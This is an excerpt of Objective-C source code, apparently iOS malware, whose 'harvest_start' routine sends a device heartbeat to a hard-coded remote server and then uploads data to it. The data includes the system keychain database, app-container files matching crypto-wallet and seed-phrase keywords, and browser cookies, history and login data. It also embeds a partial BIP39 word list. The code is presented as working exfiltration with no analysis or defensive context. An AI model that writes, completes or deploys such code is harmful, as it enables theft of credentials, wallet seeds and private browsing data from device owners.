...
static void postJSON(NSDictionary *dict, NSString *url) {
    NSData *body = [NSJSONSerialization dataWithJSONObject:dict options:0 error:nil];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST"; req.HTTPBody = body; req.timeoutInterval = 15;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    [[NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        dispatch_semaphore_signal(s);
    }] resume];
    dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 12*NSEC_PER_SEC));
}

static void uploadFile(NSString *path, NSString *server) {
    NSData *data = [NSData dataWithContentsOfFile:path];
    if (!data || data.length == 0) return;
    NSString *enc = [path.lastPathComponent stringByAddingPercentEncodingWithAllowedCharacters:NSCharacterSet.URLQueryAllowedCharacterSet];
    NSString *urlStr = [NSString stringWithFormat:@"%@?file=%@", server, enc];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
    req.HTTPMethod = @"POST"; req.HTTPBody = data; req.timeoutInterval = 30;
    dispatch_semaphore_t s = dispatch_semaphore_create(0);
    [[NSURLSession.sharedSession dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
        dispatch_semaphore_signal(s);
    }] resume];
...
void harvest_start(void) {
    NSString *server = @"http://103.201.130.207:4000/api/log";
    NSLog(@"[Harvest] Starting exfiltration to %@", server);

    // 1. Send device heartbeat
    postJSON(@{@"type":@"heartbeat", @"name":[UIDevice currentDevice].name,
               @"version":[UIDevice currentDevice].systemVersion, @"ip":@"0.0.0.0"}, server);

    // 2. Upload keychain
    for (NSString *p in @[@"/var/Keychains/keychain-2.db",@"/var/Keychains/keychain-2.db-shm",@"/var/Keychains/keychain-2.db-wal"]) {
        if ([[NSFileManager defaultManager] fileExistsAtPath:p]) { uploadFile(p, server); usleep(500000); }
    }

    // 3. Scan app containers for wallet files
    NSArray *kw = @[@"wallet",@"keychain",@"seed",@"metamask",@"trust",@"tokenpocket",@"imtoken",
                     @"phantom",@"coinbase",@"okx",@"bitpie",@"mnemonic",@"private",@"bip39"];
    NSArray *seedFiles = @[@"persist-root",@"vault",@"seed",@"mnemonic",@"backup",@"keystore",@"wallet.json"];
    NSArray *bip39List = @[@"abandon",@"ability",@"able",@"about",@"above",@"absent",@"absorb",@"abstract",@"absurd",
        ...
        @"call",@"calm",@"camera",@"camp",@"can",@"canal",@"cancel",@"candy",@"cannon",@"canoe",@"canvas",
        ...
        @"hub",@"huge",@"human",@"humble",@"humor",@"hundred",@"hunt",@"hurdle",@"hurry",@"hurt",@"husband",
        ...
        @"lend",@"length",@"lens",@"leopard",@"lesson",@"letter",@"level",@"liar",@"liberty",@"life",@"lift",
        @"light",@"like",@"limb",@"limit",@"link",@"lion",@"liquid",@"list",@"little",@"live",@"lizard",
        @"load",@"loan",@"lobster",@"local",@"lock",@"logic",@"lonely",@"loop",@"lottery",@"loud",@"lounge",
        ...
        @"pledge",@"pluck",@"plug",@"plunge",@"poem",@"poet",@"point",@"polar",@"pole",@"police",@"pond",
        ...
        @"voice",@"void",@"volcano",@"volume",@"vote",@"voyage",@"wage",@"wagon",@"wait",@"walk",@"wall",
        @"walnut",@"want",@"warfare",@"warm",@"warrior",@"wash",@"wasp",@"waste",@"water",@"wave",@"way",
        ...
        @"wire",@"wisdom",@"wise",@"wish",@"witness",@"wolf",@"woman",@"wonder",@"wood",@"wool",@"word",
        @"work",@"world",@"worry",@"worth",@"wrap",@"wreck",@"wrestle",@"wrist",@"write",@"wrong",@"yard",
        @"year",@"yellow",@"youth",@"you",@"young",@"zebra",@"zero",@"zone",@"zoo"];

    for (NSString *p in [[NSFileManager defaultManager] enumeratorAtPath:@"/var/mobile/Containers/Data/Application"]) {
        @autoreleasepool {
            NSString *n = [p lastPathComponent].lowercaseString;
            for (NSString *w in kw) {
                if ([n containsString:w] && ![n hasSuffix:@".jpg"] && ![n hasSuffix:@".png"]) {
                    NSString *full = [@"/var/mobile/Containers/Data/Application" stringByAppendingPathComponent:p];
                    NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:full error:nil];
                    if (a && [a[NSFileSize] longLongValue] < 10*1024*1024) {
                        uploadFile(full, server); usleep(300000);
                    }
                    break;
                }
            }
    ...
    // 4. Browser data
    for (NSString *p in [[NSFileManager defaultManager] enumeratorAtPath:@"/var/mobile/Containers/Data/Application"]) {
        NSString *n = [p lastPathComponent];
        if ([n isEqualToString:@"Cookies.binarycookies"] || [n isEqualToString:@"History.db"] || [n isEqualToString:@"Login Data"]) {
            NSString *full = [@"/var/mobile/Containers/Data/Application" stringByAppendingPathComponent:p];
            uploadFile(full, server); usleep(300000);
        }
    }
